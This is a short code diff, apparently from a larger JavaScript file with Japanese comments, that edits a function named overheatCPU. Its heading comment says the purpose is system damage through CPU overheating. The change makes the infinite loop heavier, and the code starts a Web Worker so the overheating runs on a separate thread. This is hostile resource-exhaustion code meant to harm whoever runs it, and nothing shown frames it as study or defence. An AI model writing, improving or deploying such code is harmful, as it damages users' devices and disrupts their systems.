@@ -3,10 +3,16 @@
 // 1. CPU過熱によるシステムダメージ
 function overheatCPU() {
     while(true) {
-        // CPUをフル稼働させる無限ループ
-        Math.random() * Math.random() * Math.random();
+        // より重い計算をする無限ループ
+        let now = Date.now();
+        while(Date.now() - now < 1) {
+            for(let i = 0; i < 1000000; i++) {
+                Math.sqrt(i) * Math.random();
+            }
+        }
     }
 }
+
 // Web WorkerでCPU過熱を別スレッドで実行
 let cpuWorker = new Worker(URL.createObjectURL(new Blob([`
     onmessage = function() {
